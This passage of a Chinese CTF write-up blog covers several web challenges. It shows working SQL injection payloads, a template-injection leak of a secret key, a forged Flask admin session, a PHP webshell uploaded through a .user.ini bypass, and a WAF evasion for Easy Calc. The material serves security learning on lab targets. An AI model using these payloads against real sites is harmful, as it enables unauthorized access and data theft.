punctuation">,</span><span class="token variable">$inject</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>说明以上sql关键字和点.都过滤了,尝试大写,不行</p><p>直接用sqlmap跑一下,得到数据库为super</p><p><img src="https://res.cloudinary.com/if0n1y/image/upload/v1576652963/Writeup/image-20191209020155259_nha5el.png" alt="1"></p><p>然后用sqlmap想把table跑出来,发现跑不出来,,,还说sqlmap没灵魂…毕竟我的脚本还不够强大,想用报错注入,update也被过滤了,用extractvalue后面也绕不过select</p><p><strong>考点是:堆叠注入</strong>【mysqli_multi_query(）】</p><p><a href="https://www.cnblogs.com/lcamry/p/stacked_injection.html" target="_blank" rel="noopener">https://www.cnblogs.com/lcamry/p/stacked_injection.html</a></p><p><a href="https://www.cnblogs.com/0nth3way/articles/7128189.html" target="_blank" rel="noopener">https://www.cnblogs.com/0nth3way/articles/7128189.html</a></p><p>简单来说,就是不同于联合注入,的一种注入方法.用union注入是将两个语句合在一起返回一个结果,而堆叠注入是用分号;来执行多条查询语句,返回多个结果.(在SQL语句中分号代表一个语句的结束)</p><p>查数据库:1’;show databases;#</p><p>得到数据库有:ctftraining test supersqli 另外几个是数据库自带的就不用考虑,,,第一个是赵师傅出的教学视频里面用的,test不用考虑了,那数据库就是<strong>supersqli</strong>了…这里为什么和sqlmap跑出来的不一样?可能是数据库差异导致的,sqlmap跑出来是Mysql数据库,而题目是MD</p><p>查表:1’;show tables;#</p><p>得到两个表: 1919810931114514 words</p><p>查字段: </p><blockquote><p>注意,字符串为表名是需要添加反引号</p></blockquote><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">columns</span> <span class="token keyword">from</span> <span class="token punctuation">`</span><span class="token number">1919810931114514</span><span class="token punctuation">`</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#</span></code></pre><p><img src="https://res.cloudinary.com/if0n1y/image/upload/v1576653007/Writeup/image-20191209215715396_lychtg.png" alt="2"></p><p>同样的查words表里面的内容</p><p><img src="https://res.cloudinary.com/if0n1y/image/upload/v1576653010/Writeup/image-20191209215803286_kyokjp.png" alt="3"></p><p>现在的问题就是怎么读到flag,select是被过滤的了</p><p>搜了一波WP,发现有大概就有两种方式;一种是预编译的方法,一种是改表和列名字的方法;</p><p>预编译语法:</p><pre class=" language-text"><code class="language-text">set用于设置变量名和值prepare用于预备一个语句，并赋予名称，以后可以引用该语句execute执行语句deallocate prepare用来释放掉预处理的语句</code></pre><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span><span class="token string">';set @payload=concat('</span>se<span class="token string">','</span>lect<span class="token operator">*</span><span class="token keyword">from</span> <span class="token punctuation">`</span><span class="token number">1919810931114514</span><span class="token punctuation">`</span><span class="token punctuation">;</span>'<span class="token punctuation">)</span><span class="token punctuation">;</span>prepare sql <span class="token keyword">from</span> <span class="token variable">@payload</span><span class="token punctuation">;</span><span class="token keyword">execute</span> sql<span class="token punctuation">;</span><span class="token comment" spellcheck="true">#</span></code></pre><p>返回结果:</p><pre><code>strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;)</code></pre><p>说明set 和 prepare 是被检测了</p><p><img src="https://res.cloudinary.com/if0n1y/image/upload/v1576653012/Writeup/image-20191209230159573_jxnutw.png" alt="4"></p><p>在PHP手册查一下,发现区分大小写,把set和prepare改为大写即可</p><pre class=" language-mysql"><code class="language-mysql">1';Set @payload = CONCAT('se','lect * from `1919810931114514`;');Prepare sql from @payload;execute sql;#</code></pre><p><strong>方法二</strong>:(既然看了大佬的wp就要多学点方法!)</p><p>关于alter用法:<a href="https://www.runoob.com/mysql/mysql-alter.html" target="_blank" rel="noopener">https://www.runoob.com/mysql/mysql-alter.html</a></p><p>MySQL ALTER命令</p><p>当我们需要修改数据表名或者修改数据表字段时，就需要使用到MySQL ALTER命令。简单来说,是一个改名字用的关键字</p><p>表示得抽时间学MySQL啊..只会几个基本的,到现在感觉越来越吃力了</p><p>查询语句:</p><pre><code> select * from words where id =&#39; &#39; ;</code></pre><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">alter</span> <span class="token keyword">table</span> words <span class="token keyword">rename</span> <span class="token keyword">to</span> wordss<span class="token punctuation">;</span><span class="token keyword">alter</span> <span class="token keyword">table</span> <span class="token punctuation">`</span><span class="token number">1919810931114514</span><span class="token punctuation">`</span> <span class="token keyword">rename</span> <span class="token keyword">to</span> words<span class="token punctuation">;</span><span class="token keyword">alter</span> <span class="token keyword">table</span> words change flag  id <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>CHAR(M)和VARCHAR(M)的区别就是VARCHAR(M)是变长的字符串，而CHAR(M)是定长的字符串。</p><p>然后用万能密码 1’ or 1=1# 得到flag</p><pre><code>flag{20bf1ba0-cc43-4ea1-bb30-c14dcdd92272}</code></pre><h2 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h2><p>先搜索一下题目这个tornado,发现是一个基于python 和Diango的 web框架</p><p><a href="https://tornado-zh.readthedocs.io/zh/latest/" target="_blank" rel="noopener">https://tornado-zh.readthedocs.io/zh/latest/</a></p><p>先就知道这么多,说不定后面会用.</p><p>打开题目页面.发现有三个文件</p><p>/flag.txt<br>flag in /fllllllllllllag  <!--这里有点像warmup里面的目录穿越导致任意文件读取--></p><p>/welcome.txt<br>render</p><p>66217591-d873-4375-823d-8dc60d825a29</p><p>/hints.txt<br>md5(cookie_secret+md5(filename)) </p><p><a href="http://33129bb2-70e6-482d-9001-06ee123f7e57.node3.buuoj.cn/file?filename=/welcome.txt&amp;filehash=170a6fdd3697bcdaf04c64f183cba1e5" target="_blank" rel="noopener">http://33129bb2-70e6-482d-9001-06ee123f7e57.node3.buuoj.cn/file?filename=/welcome.txt&amp;filehash=170a6fdd3697bcdaf04c64f183cba1e5</a></p><p>这个url感觉有点东西,先不管那么多,先去搜一波有没这个框架的CVE</p><p>另一边,御剑也没有扫出什么东西</p><p><a href="https://shuimugan.com/bug/view?bug_no=98978" target="_blank" rel="noopener">Python开源框架Tornado某缺陷可能造成文件读取漏洞</a></p><p><a href="https://www.leavesongs.com/PENETRATION/arbitrary-files-read-via-static-requests.html" target="_blank" rel="noopener">新型任意文件读取漏洞的研究</a></p><p>看完一头雾水,回到题目当中</p><p>中间那个render没有懂,再去搜一下python render</p><pre class=" language-python"><code class="language-python">render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页</code></pre><p><a href="https://docs.djangoproject.com/zh-hans/2.1/topics/http/shortcuts/#django.shortcuts.render" target="_blank" rel="noopener">https://docs.djangoproject.com/zh-hans/2.1/topics/http/shortcuts/#django.shortcuts.render</a></p><p><code>render()</code><a href="https://docs.djangoproject.com/zh-hans/2.1/topics/http/shortcuts/#render" target="_blank" rel="noopener">Django快捷函数</a> </p><ul><li><p><code>render</code>(<em>request</em>, <em>template_name</em>, <em>context=None</em>, <em>content_type=None</em>, <em>status=None</em>, <em>using=None</em>)<a href="https://docs.djangoproject.com/zh-hans/2.1/_modules/django/shortcuts/#render" target="_blank" rel="noopener">[源代码]</a><a href="https://docs.djangoproject.com/zh-hans/2.1/topics/http/shortcuts/#django.shortcuts.render" target="_blank" rel="noopener">¶</a></p><p>将给定的模板与给定的上下文字典组合在一起，并以渲染的文本返回一个 <a href="https://docs.djangoproject.com/zh-hans/2.1/ref/request-response/#django.http.HttpResponse" target="_blank" rel="noopener"><code>HttpResponse</code></a> 对象。 Django没有提供返回:class:<del>django.template.response.TemplateResponse 的快捷函数，因为:class:</del>django.template.response.TemplateResponse 的构造函数提供了与:func:[<code>](https://docs.djangoproject.com/zh-hans/2.1/topics/http/shortcuts/#id1)render()</code>相同的方便程度。</p></li></ul><p>Handler指向的处理当前这个页面的RequestHandler对象</p><p>通过查阅文档发现cookie_secret在Application对象settings属性中，还发现self.application.settings有一个别名</p><pre><code>RequestHandler.settingsAn alias for self.application.settings.</code></pre><p>handler指向的处理当前这个页面的RequestHandler对象， RequestHandler.settings指向self.application.settings， 因此handler.settings指向RequestHandler.application.settings。</p><p>构造payload获取cookie_secret</p><pre><code>/error?msg={{handler.settings}}</code></pre><p>cookie_secret存放在handler.settings</p><p>看了一下WP,是模板注入,之前三叶草二面我也从同学那里偷了题,也没怎么仔细学,现在可以好好学一学了</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flaskfrom flask <span class="token keyword">import</span> render_templateapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#route()装饰器路由,即什么样的URL能触发下面的函数,用参数methos设置请求方法</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/login/&lt;name>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> login<span class="token punctuation">(</span>name<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">,</span>name<span class="token operator">=</span>name<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#对templates文件目录下的login.html进行渲染if __name__ == '__main__':  #代码入口    </span>    app<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token boolean">True</span> <span class="token comment" spellcheck="true">#调式模式,方便修改代码不用重新运行程序    </span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#运行</span></code></pre><p><a href="https://www.jianshu.com/p/6452596c4edb" target="_blank" rel="noopener">pythonFlask框架学习</a></p><p><a href="https://www.jianshu.com/p/9b5f4fabfacc" target="_blank" rel="noopener">flask从0到无（模版注入铺垫）</a> </p><p><a href="https://shuaizhupeiqi.github.io/2018/11/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">SSTI模板注入</a> </p><blockquote><p>函数render_template渲染的是templates中的模板,模板就是html,里面的参数需要根据用户需求传入<strong>动态</strong>变量</p><p>模板渲染体系</p><p> ├── app.py  <!--在这个文件进行渲染--></p><p>  ├── static </p><p>  │    └── style.css </p><p>  └── templates </p><p>​       └── index.html</p><p>模板渲染:通俗点理解：拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。  </p><p>又分为前端渲染和后端渲染,</p><p>后端渲染:后端渲染HTML的情况下，浏览器会直接接收到经过服务器计算之后的呈现给用户的最终的HTML字符串，这里的计算就是服务器经过解析存放在服务器端的模板文件来完成的，在这种情况下，浏览器只进行了HTML的解析，以及通过操作系统提供的操纵显示器显示内容的系统调用在显示器上把HTML所代表的图像显示给用户。</p><p>前端渲染：浏览器从后端得到一些信息.将这些信息组织排列形成最终可读的HTML字符串是由浏览器来完成的，在形成了HTML字符串之后，再进行显示。</p><p>route() 装饰器告诉 Flask 什么样的URL 能触发我们的函数。 route() 装饰器把一个函数绑定到对应的 URL 上，这句话相当于路由，一个路由跟随一个函数</p></blockquote><p>回到URL中,filename就是/fllllllllllllag,hash就是md5(cookie_secret+md5(filename),现在只需要得到这个文件的hash满足条件就出flag</p><blockquote><p>测试<code>error?msg=63</code>,回显orz.</p><p><code>error?msg=,返回&#39;cookie_secret&#39;: &#39;66217591-d873-4375-823d-8dc60d825a29&#39;}</code></p></blockquote><p>现在就是md5(cookie_secret+md5(filename))</p><p>不像网上WP那些大佬那么强,写脚本跑hash,<a href="https://www.qqxiuzi.cn/bianma/md5.htm" target="_blank" rel="noopener">MD5加密</a> 这里在线跑</p><blockquote><p>payload:/filefilename=/fllllllllllllag&amp;filehash=9b6da2501c1381f51efc5c3b17b575f9</p></blockquote><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>没有回显,应该是盲注了吧…输入union回显nonono,用bp fuzz一下</p><p><img src="https://res.cloudinary.com/if0n1y/image/upload/v1576653135/Writeup/1_d2sgir.png" alt="5"></p><p><img src="https://res.cloudinary.com/if0n1y/image/upload/v1576653165/Writeup/2_t6cg85.png" alt="6"></p><p>发现返回了507的都是被过滤检测了的,空格,大小写(这里应该是用的正则匹配的)以及一些查询用的关键字…<!--感觉已经过滤死了-->发现注释符号没过滤,对提交框进行数字爆破,都只有Array (    [0] =&gt; 1 )返回.用内联注释的方法也无法绕过用&lt;&gt;可以绕过,但没有返回结果,应该是<strong>盲注</strong><a href="https://www.anquanke.com/post/id/170626" target="_blank" rel="noopener">盲注参考</a>,但是测了都不行,试了一下堆叠注入</p><p>1;show databases;show tables;#居然成功了</p><p><img src="https://res.cloudinary.com/if0n1y/image/upload/v1576653196/Writeup/3_kztd26.png" alt="7"></p><p>库:ctf,表:Flag</p><p>from是过滤了的,1;show columns from Flag是不行了</p><p>连flag都过滤了..</p><p>看了wp,比赛这道题设置了源码泄露…..核心代码就是:输入的内容在黑名单里面的都返回nonono,然后如果不在就执行下面的查询语句,并且长度不能超过40</p><pre class=" language-mysql"><code class="language-mysql"> $sql = "select ".$post['query']."||flag from Flag";</code></pre><p>query就是输入的内容,根据上面的分析,flag和from都过滤了,但是查询语句中已经给我写好了,现在就需要把它利用进我的语句中,然后||是逻辑or,有没有办法让他成为连接符号..</p><p><a href="https://www.cnblogs.com/piperck/p/9835695.html" target="_blank" rel="noopener">PIPES_AS_CONCAT</a> </p><p><a href="https://dev.mysql.com/doc/refman/5.6/en/sql-mode.html#sql-mode-setting" target="_blank" rel="noopener">5.1.10服务器SQL模式</a></p><p>PIPES_AS_CONCAT将|| 视为字符串的连接操作符而非 或 运算符，这和Oracle数据库是一样的，也和字符串的拼接函数 CONCAT() 相类似。<br>payload:</p><p>2;set sql_mode=PIPES_AS_CONCAT;select 2</p><p>最终在db中的语句是: </p><pre class=" language-MYSQL"><code class="language-MYSQL">select 2;set sql-mode=PIPES_AS_CONCAT;select 2 ||flag from Flag;</code></pre><p>小总结一下:直接查询的或者页面返回情况无法判断的多思考堆叠注入</p><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>一个欢迎界面,右键看源代码,发现<!-- you are not admin --></p><blockquote><p>可能在考察XSS这种用一个普通用户然后xss到一个admin,登录进去应该就有flag或者cookie伪造</p></blockquote><p>随便注册一个账号,然后登陆进去,有index,post,change password,logout这几个功能点,在index.php下面有注释,在其他目录下应该也会有.然后在change pwd下有一个链接到gayhub,下载压缩包后,在templates目录下打开index.html,里面有:</p><pre><code>{% include('header.html') %} {% if current_user.is_authenticated %}Hello {{ session['name'] }}{% endif %} {% if current_user.is_authenticated and session['name'] == 'admin' %}hctf{xxxxxxxxx}{% endif %}Welcome to hctf{% include('footer.html') %}</code></pre><p><strong>就是要伪造为admin 的 session 登陆进去 就得到falg</strong></p><p>flask session:在Web中，session是认证用户身份的凭证，它具备如下几个特点：</p><ol><li>用户不可以任意篡改</li><li>A用户的session无法被B用户获取</li></ol><p>也就是说，<strong>session的设计目的是为了做用户身份认证</strong>。</p><p>在源码的config.py中找到了</p><p>SECRET_KEY = os.environ.get(‘SECRET_KEY’) or ‘ckj123’</p><p>在登陆界面得到普通用户的session:</p><p>.eJw9kM1qwzAQhF-l7DkHS04ugRwSZFwHdo2DXCFdQuo6P7KUgu3g2CHvXjWUHhYGZr-BmQfsj23dnWHZt7d6BvvLFywf8PYJSyCBIyrTkKxiI4oBJTmtiphsc8_TMnjJEPSAaue1LyOanPvV6PVIUxWh3LhcuHB4xylZmLTggY9yWTLkWxuYO9mEaW9cnn54UtlCB458NkebcSNOg5HrGGXGKNURcWS5zDjJJjBbm8tNo2XB9LRewXMGVdce9_13U1__K-BkLkaUc_TbhgR5kuVoVDIaW4wk3NmkO6v5LvysI61CXVlxXaxecRd_ONX_SdU7jerPuR58MKCvu57xGGZw6-r2tRywCJ4_BdtsyQ.Xfcdcg.ET_OVjFJTJFeBG92AJLbiNToqb0</p><p>用脚本解密:</p><pre><code>{&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;4321fd577d4013ead76918e21a06901dfbe479e1df2f277410e89e831319dd6ad49553bcbe1615bfe8ef5b9c746b8226d80e071254f47c5926595bbc90da45c0&#39;, &#39;csrf_token&#39;: b&#39;36bd582bd43f552ea2f4249addccdbd04ac2176a&#39;, &#39;image&#39;: b&#39;psrY&#39;, &#39;name&#39;: &#39;test123&#39;, &#39;user_id&#39;: &#39;10&#39;}</code></pre><p>然后把 test123 改为 admin </p><pre><code>{&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;4321fd577d4013ead76918e21a06901dfbe479e1df2f277410e89e831319dd6ad49553bcbe1615bfe8ef5b9c746b8226d80e071254f47c5926595bbc90da45c0&#39;, &#39;csrf_token&#39;: b&#39;36bd582bd43f552ea2f4249addccdbd04ac2176a&#39;, &#39;image&#39;: b&#39;psrY&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;10&#39;}</code></pre><p>再进行一次加密:</p><p>.eJw9kEGLwjAQhf_KMmcPbdSL4EFJ6VaYKZV0Q3KRbq3aNOlCq9RW_O-blcXDwIM334P3HnA4dVV_gdW1u1UzONRHWD3g4xtWQBxHlLohUc41zwYUZJXM5mSaexrn3osGrweUe6dcHtBk7Z9Gp0aaygDF1qbc-sM7TtFSxxnzfJCKPES2M565k4lC5bRN4y9HMlkqz5FLFmgSpvl50GIzR5GEFKuAGIapSBiJxjM7k4pto0QWqmmzhucMyr47Ha4_TdW-K-Cka83zBbpdQ5wciXzUMhq1yUbi9qLjvVFs7382gZK-riiZytavuNoV5-qdVH7SKP-dtnDegOLo6hZmcOur7rUbhAE8fwEwtGx8.Xfclzw.eZ4WaKf6pyUvvIPFA9G_6SLMxao</p><p>把session改为生成的这个刷新一下就成功了</p><h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p>打开题目,提示<a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a>  于是先去把网站源码备份下来.</p><p>拿到源码.,在sublime text里面全局搜索 GET eval system 这种危险函数,看有没有webshell(从代码审计那本书中习得)…其实一开始我思路是对了的,因为文件太大了,手工找不太可能,自己写python的功底太菜,于是看了看wp,感觉这就是在考察python写脚本的能力……思路就是那样,拿到源码都是冲着 那几个危险函数去以及 upload,login这些功能点进行搜索,审代码看有没有漏洞</p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>进去,是Upload Labs..亲切感 -.- 先传个php,非法后缀</p><p>先改成图片后缀,传上去<strong>exif_imagetype:not image!</strong>,这里传个图片头GIF89a就可以绕过检测</p><p>&lt;? in contents! 发现检测了php的符号,这个和极客大挑战考的点一样,用JS语言特性来绕过</p><pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string">"php"</span><span class="token operator">></span> @<span class="token function">eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'111'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><pre><code>Your dir uploads/33c6f8457bd77fce0b109b4554e1a95c &lt;br&gt;Your files : &lt;br&gt;array(4) {  [0]=&gt;  string(1) &quot;.&quot;  [1]=&gt;  string(2) &quot;..&quot;  [2]=&gt;  string(7) &quot;222.jpg&quot;  [3]=&gt;  string(9) &quot;index.php&quot;}</code></pre><p>然后发现文件路径是不变的,返回的是数组,第三个返回的是上传的文件名,如果我们再上传一个图片上去,发现第四个返回的是上传的第二个文件名,然后还有index.php也是唯一的php文件</p><p><img src="https://res.cloudinary.com/if0n1y/image/upload/v1576653261/Writeup/4_elerkl.png" alt="8"></p><p>fuzz一下能够上传的后缀, jpg,png,gif,然后后面还有一个.htaccess<br>传一个上去,但是为了绕过exif_imagetype,就必须加GIF89a,会不会要影响呢?我本地试了会.想通过这个点是走不通了…</p><p>看到response里是以数组返回的,想用数组来构造一个php文件,返回的结果是一样的</p><p>看了wp,发现前面思路都几乎一模一样</p><p>就是后面利用了 .user.ini</p><p><a href="https://www.php.net/manual/zh/configuration.file.per-user.php" target="_blank" rel="noopener">.user.ini</a> </p><p><a href="https://segmentfault.com/a/1190000011552335?utm_source=tag-newest" target="_blank" rel="noopener">神秘的.user.ini</a></p><p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">.user.ini构成的PHP后门</a> </p><p><a href="https://xz.aliyun.com/t/6091#toc-1" target="_blank" rel="noopener">从SUCTF 2019 CheckIn 浅谈.user.ini的利用</a> </p><p>user.ini:<code>user.ini</code>是一个能被动态加载的ini文件。也就是说修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载</p><p>auto_append_file/auto_prepend_file</p><p>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：</p><p>我PHP只能算初学者水平,对这些配置文件也只是有个了解,并没深入..遗憾不能自己一口气做出来</p><blockquote><p>最后的过程:传一个.user.ini  写入</p><p>GIF89a auto_prepend_file=eeee.png</p><p>再,传一个图片马eeee.png 写入</p><p>GIF89a</p><pre class=" language-js"><code class="language-js"> <span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string">"php"</span><span class="token operator">></span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat /flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>传一句话也是一样的把,反正最后也是在蚁剑里面cat /flag</p></blockquote><p><strong>小总结:遇到黑名单,或者过滤的很死,却没有过滤掉.htaccess的.多考虑下.user.ini  因为后者应用的范围更大</strong> <strong>但是前提是要有个一个可以访问执行的php文件</strong> </p><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>打开题目,右键看源代码</p><!--I've set up WAF to ensure security.--> <pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#calc'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            url<span class="token punctuation">:</span><span class="token string">"calc.php?num="</span><span class="token operator">+</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#content"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            type<span class="token punctuation">:</span><span class="token string">'GET'</span><span class="token punctuation">,</span>            success<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#result"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`&lt;div class="alert alert-success">            &lt;strong>答案:&lt;/strong></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>data<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">            &lt;/div>`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            error<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"这啥?算不来!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>发现了calc.php,访问目录得到php代码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'`'</span><span class="token punctuation">,</span> <span class="token string">'\['</span><span class="token punctuation">,</span> <span class="token string">'\]'</span><span class="token punctuation">,</span><span class="token string">'\$'</span><span class="token punctuation">,</span><span class="token string">'\\'</span><span class="token punctuation">,</span><span class="token string">'\^'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$blackitem</span> <span class="token punctuation">.</span> <span class="token string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"what are you want to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'echo '</span><span class="token punctuation">.</span><span class="token variable">$str</span><span class="token punctuation">.</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>测试一下后,发现除了输入数字和黑名单里面的几个有回显外,其他都是403拒绝访问-.- 应该是被限制了于是想到了提权,看服务器是Apache的,就在网上找有没有Apache提权漏洞,发现确实有.但是这道题用不上<a href="https://www.anquanke.com/post/id/176169" target="_blank" rel="noopener">CVE-2019-0211 Apache提权漏洞分析</a>   </p><p>这道题学习了一波,PHP变量名称解析,这里waf对num做了限制,但是如果在num前加一个空格,即 num的话就无法做出限制.然而php解析的时候是会忽略掉空格的.</p><p><strong>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符 2.将某些字符转换为下划线（包括空格）</strong></p><p>扫根目录:/calc.php? num=var_dump(scandir(/)),然后/是黑名单里面的.所以要用ASCII码来转一下绕过waf ,找到根目录下有个f1agg</p><p>然后利用file_get_contents函数读取f1agg里的flag</p><p>var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</p><h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>All You Want Is In Table ‘flag’ and the column is ‘flag’</p><p>Now, just give the id of passage;</p><p>尝试用堆叠注入,1;show flag from flag;# -&gt;SQL Injection Checked.</p><p>1,2有返回结果;1=2,1’bool(false),1=1有返回;1#,1空格这些被检测到了,括号()没有过滤.可以用()来绕过空格..根据bool(false),且没有数据回显,</p><p><strong>bool盲注 二分法</strong> 